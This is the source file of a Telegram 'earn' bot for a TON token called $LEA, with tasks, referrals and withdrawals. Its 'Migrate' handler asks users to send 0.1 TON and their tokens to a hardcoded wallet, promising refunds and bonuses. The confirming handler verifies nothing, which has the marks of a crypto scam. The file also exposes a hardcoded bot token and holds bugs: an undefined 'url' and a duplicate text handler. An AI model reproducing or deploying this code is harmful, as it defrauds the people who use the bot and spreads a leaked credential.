const express = require('express');
const { Telegraf, Markup } = require('telegraf');
const userTasks = {}; // Add this line at the top of your bot.js file
const axios = require('axios');
const db = require('./firebase');
const tasks = require('./tasks');
const checkBalance = require('./balance');
const admin = require('firebase-admin');
const bot = new Telegraf('5848386549:AAHvPrmirUkirfGfv60d_oq_VR45qdBxhqs');

// Initialize Express app
const app = express();
const port = process.env.PORT || 4000;

const groupLink = 'https://t.me/alliance_Ton';
const groupName = 'TON Alliance Earn Platform';
const groupId = -1002241002221; // Replace with your actual Telegram group ID

const welcomeGif = 'https://media.giphy.com/media/xT9IgG50Fb7Mi0prBC/giphy.gif';
const welcomeImage = 'https://ibb.co/RHKK2Cq'; // Replace with your actual image URL

// Retry function
const retryOperation = async (operation, retries = 3, delay = 1000) => {
  while (retries > 0) {
    try {
      return await operation();
    } catch (error) {
      if (retries === 1) throw error;
      retries--;
      console.log(`Retrying... ${retries} attempts left`);
      await new Promise(res => setTimeout(res, delay));
    }
  }
};


// Express server route
app.get('/', (req, res) => {
  res.send('Hello World!');
});

app.listen(port, () => {
  console.log(`Express server listening on port ${port}`);
});

const checkAndSaveUser = async (user, referralCode) => {
  const userRef = db.collection('users').doc(String(user.id));
  const doc = await userRef.get();
  
  if (!doc.exists) {
    const referrerId = referralCode ? parseInt(referralCode) : null;
    const newUser = {
      userId: user.id,
      chatId: user.id,
      username: user.username,
      referralNo: 0,
      balance: 0,
      withdrawalAddress: null,
      referrals: [],
      earnings: 0,
      completedTasks: []
    };
    
    if (referrerId) {
      // Update referrer’s referral count and earnings
      const referrerRef = db.collection('users').doc(String(referrerId));
      const referrerDoc = await referrerRef.get();
      if (referrerDoc.exists) {
        await referrerRef.update({
          referralNo: admin.firestore.FieldValue.increment(1),
          earnings: admin.firestore.FieldValue.increment(100) // Assuming 100 LEA is awarded per referral
        });
        // Add the new user to the referrer's referral list
        newUser.referrals.push(referrerId);
      }
    }
    
    await userRef.set(newUser, { merge: true });
    return false; // New user
  }
  return true; // Returning user
};


bot.start(async (ctx) => {
  const referralCode = ctx.message.text.split(' ')[1]; // Assuming referral code is passed as /start <referralCode>
  const isReturningUser = await checkAndSaveUser(ctx.from, referralCode);

  if (isReturningUser) {
    ctx.replyWithPhoto(welcomeImage, {
      caption: `🎉 *Welcome back, ${ctx.from.first_name}!* 🎉\n\nYour User ID: ${ctx.from.id}\n\nPerform tasks and refer friends to earn $LEA.`,
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('📝 Tasks for the Day', 'tasks')],
        [Markup.button.callback('🤝 Refer Friends', 'refer')],
        [Markup.button.callback('💰 Balance', 'balance')],
        [Markup.button.callback('💰 Migrate Tokens', 'Migrate')]
      ])
    });
  } else {
    ctx.replyWithAnimation(welcomeGif, {
      caption: `🎉 *Welcome to ${groupName}!* 🎉\n\nPlease join our Telegram group [here](${groupLink}) to start earning $LEA. 💰 Press "Proceed" to start using the bot.\n\n_Bot version: 0.1.13_`,
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('🚀 Proceed', 'proceed')]
      ])
    });
  }
});


bot.action('proceed', async (ctx) => {
  const userId = ctx.from.id;
  const messageId = ctx.update.callback_query.message.message_id;

  try {
    const chatMember = await bot.telegram.getChatMember(groupId, userId);

    if (['member', 'administrator', 'creator'].includes(chatMember.status)) {
      await bot.telegram.deleteMessage(ctx.chat.id, messageId);
      ctx.replyWithPhoto(welcomeImage, {
        caption: `🎉 *Welcome back, ${ctx.from.first_name}!* 🎉\n\nYour User ID: ${userId}\n\nPerform tasks and refer friends to earn $LEA.`,
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          Markup.button.callback('📝 Tasks for the Day', 'tasks'),
          Markup.button.callback('🤝 Refer Friends', 'refer'),
          Markup.button.callback('💰 Balance', 'balance')
        ])
      });
    } else {
      await bot.telegram.deleteMessage(ctx.chat.id, messageId);
      ctx.reply(`🚫 *You need to join the group first.*\n\nPlease join [here](${groupLink}) and then press "Proceed" again.`,
        Markup.inlineKeyboard([
          Markup.button.callback('🚀 Proceed', 'proceed')
        ])
      );
    }
  } catch (error) {
    console.error('Error checking group membership:', error);
    ctx.reply('⚠️ There was an error checking your group membership. Please try again later.');
  }
});

const taskGifUrl = 'https://media4.giphy.com/media/4xWGyVKoXqg2eVCiq9/giphy.gif'; // Replace with your desired GIF URL

bot.action('tasks', async (ctx) => {
  const availableTasks = await tasks.getTasksForUser(ctx.from.id);
  
  if (availableTasks.length === 0) {
    await ctx.replyWithAnimation(
      'https://media.giphy.com/media/xTkcEQACH24SMPxIQg/giphy.gif', // Replace with a different GIF URL if desired
      { caption: '🎉 All tasks are completed for today!' }
    );
    return;
  }

  // Send the GIF first before the tasks
  await ctx.replyWithAnimation(taskGifUrl, { caption: '📋 *Your Tasks for Today:*', parse_mode: 'Markdown' });

  availableTasks.forEach((task, index) => {
    ctx.reply(`${index + 1}. ${task.description}`, {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        Markup.button.callback('✅ Done', `done_${task.id}`)
      ])
    });
  });
});


bot.action(/^done_(.+)$/, async (ctx) => {
  const taskId = ctx.match[1];
  const task = await tasks.getTaskById(taskId);

  if (task) {
    userTasks[ctx.from.id] = task; // Store the task for the user

    let promptMessage = "🔄 Please provide the required details to verify the task.";

    // Determine prompt based on the task type
    switch (task.type) {
      case 'telegramGroup':
      case 'telegramName':
        promptMessage = "🔄 Please provide your *Telegram username* starting with @ to verify the task.";
        break;
      case 'twitter':
      case 'twitterLink':
        promptMessage = "🔄 Please provide your *Twitter username* to verify the task.";
        break;
      default:
        // Default prompt is already set
        break;
    }

    ctx.reply(promptMessage, { parse_mode: 'Markdown' });
  } else {
    ctx.reply("⚠️ *Task not found.* Please try again.", { parse_mode: 'Markdown' });
  }
});


bot.action('Migrate', async (ctx) => {
  await ctx.replyWithMarkdown(
    `🔄 *Token Migration Process:*\n\nTo migrate your tokens:\n\n1. Send **0.1 TON** and your old **$LEA tokens** to the following address:\n\n💰 *UQBKr2FVzJziyXWoIBnq-yFT6UH4-DlBMgY1ty4sKiV3vLuP*\n\n2. Once the transaction is complete, click the "Done" button below.\n\n✨ You will receive the 0.1 TON back, plus the new tokens and an additional **500 $LEA**.\n\nPlease note that it may take up to 24 hours for the new tokens to arrive.\n\nIf you do not receive them within this time frame, please contact an admin.`,
    {
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ Done", callback_data: 'migration_done' }]
        ]
      }
    }
  );
});

// Handle the "Done" button click
bot.action('migration_done', async (ctx) => {
  await ctx.replyWithMarkdown(
    `✅ *Your token migration request has been received!*\n\nYou will receive the new tokens and additional 500 $LEA within 24 hours.\n\nIf you do not receive them within this time frame, please contact an admin for assistance.`
  );
});


bot.action('refer', async (ctx) => {
  const userId = ctx.from.id;
  const userRef = db.collection('users').doc(String(userId));
  const userDoc = await userRef.get();
  
  if (userDoc.exists) {
    const referralLink = `https://t.me/EARNLEA_bot?start=${userId}`;
    ctx.reply(`🔗 <b>Refer Friends:</b>\n\nShare this link to invite friends and earn $LEA: <a href="${referralLink}">${referralLink}</a>\n\nYou have referred ${userDoc.data().referralNo} friends and earned ${userDoc.data().earnings} LEA.`, { parse_mode: 'HTML' });
  } else {
    ctx.reply("⚠️ <b>User data not found.</b> Please try again later.", { parse_mode: 'HTML' });
  }
});


bot.action('balance', async (ctx) => {
  const userId = ctx.from.id;
  const userRef = db.collection('users').doc(String(userId));
  const doc = await userRef.get();

  if (doc.exists) {
    const userData = doc.data();
    const balance = userData.balance || 0;

    // Check if the balance is sufficient for withdrawal
    if (balance >= 500) {
      ctx.replyWithMarkdown(
        `💰 *Your balance:* ${balance} $LEA\n\n🎉 You have enough $LEA to withdraw! Please send your TON wallet address to proceed with the withdrawal.`,
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: "Withdraw", callback_data: 'withdraw' }]
            ]
          }
        }
      );

      // Store the balance in user data for withdrawal process
      userTasks[userId] = { balance };
    } else {
      ctx.replyWithMarkdown(
        `😔 *Your balance:* ${balance} $LEA\n\n💸 You need at least 500 $LEA to withdraw. Invite a friend and complete all tasks to reach the minimum withdrawal amount.`,
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: "Invite a Friend", callback_data: 'refer' }]
            ]
          }
        }
      );

      // Attach a sad, poor GIF (Sample GIF URL)
      ctx.replyWithAnimation("https://media.giphy.com/media/3o7btPCcdNniyf0ArS/giphy.gif");
    }
  } else {
    ctx.reply("⚠️ No data found for this user.");
  }
});
bot.action('withdraw', async (ctx) => {
  const userId = ctx.from.id;
  const userRef = db.collection('users').doc(String(userId));
  const doc = await userRef.get();

  if (doc.exists) {
    const userData = doc.data();
    const balance = userData.balance || 0;

    if (balance >= 500) {
      // Ask for the TON wallet address
      ctx.replyWithMarkdown(
        `💸 *Great!* Please send your TON wallet address to proceed with the withdrawal.`,
        {
          reply_markup: {
            force_reply: true,
          }
        }
      );

      // Store the withdrawal intent
      userTasks[userId] = { action: 'withdraw', balance };
    }
  } else {
    ctx.reply("⚠️ No data found for this user.");
  }
});
//handle adress
bot.on('text', async (ctx) => {
  const userId = ctx.from.id;
  const userTask = userTasks[userId];

  if (userTask && userTask.action === 'withdraw') {
    const tonAddress = ctx.message.text;

    // Retrieve the user's balance before updating the database
    const userSnapshot = await db.collection('users').doc(String(userId)).get();
    const userData = userSnapshot.data();
    const userBalance = userData.balance || 0;

    // Save the TON wallet address and reset the user's balance to 0
    const userRef = db.collection('users').doc(String(userId));
    await userRef.update({
      tonAddress: tonAddress,
      balance: 0
    });

    // Confirm the withdrawal
    ctx.replyWithMarkdown(
      `🎉 *Your withdrawal request has been received!* Your TON address: ${tonAddress}\n\n*We will process your request shortly.*`
    );

    // Attach a happy, rich GIF (Sample GIF URL)
    ctx.replyWithAnimation("https://media.giphy.com/media/l0HlHFRbmaZtBRhXG/giphy.gif");

    // Notify admin about the withdrawal request
    await ctx.telegram.sendMessage(
      6534240629, // The correct user ID for @TonFlr
      `🚨 *Withdrawal Request*\n\nUser ID: ${userId}\nBalance Amount: ${userBalance} LEA\nTON Address: ${tonAddress}\n\nPlease process the withdrawal accordingly.`,
      { parse_mode: 'Markdown' }
    );

    // Clear the task from userTasks
    delete userTasks[userId];
    return;
  }

  // Continue with task completion logic if not withdrawing
  const task = userTasks[userId];

  if (task) {
    const userInput = ctx.message.text;

    if (task.id === '6' || task.id === '7') {
      if (userInput === `@${ctx.from.username}`) {
        await db.collection('users').doc(String(ctx.from.id)).update({
          balance: admin.firestore.FieldValue.increment(task.points),
          completedTasks: admin.firestore.FieldValue.arrayUnion(task.id)
        });
        ctx.reply('✅ Done.');
      } else {
        ctx.reply(`❌ The username you submitted does not match your Telegram username. Make sure to join the group required by the task and ensure you are submitting your correct Telegram username.`);
      }
    } else {
      await tasks.handleTaskCompletion(ctx, task.id, userInput);
    }

    delete userTasks[userId];
  }
});



bot.command('start', async (ctx) => {
  const query = url.parse(ctx.message.text, true).query;
  const referralCode = query.ref;

  // Process the referral code if it exists
  await checkAndSaveUser(ctx.from, referralCode);
  
  // Continue with the existing /start logic
});
bot.on('text', async (ctx) => {
  if (ctx.message.text.startsWith('https://t.me/EARNLEA_bot/start?ref=')) {
    const referralCode = ctx.message.text.split('ref=')[1];
    await checkAndSaveUser(ctx.from, referralCode);
  }
});


bot.launch();
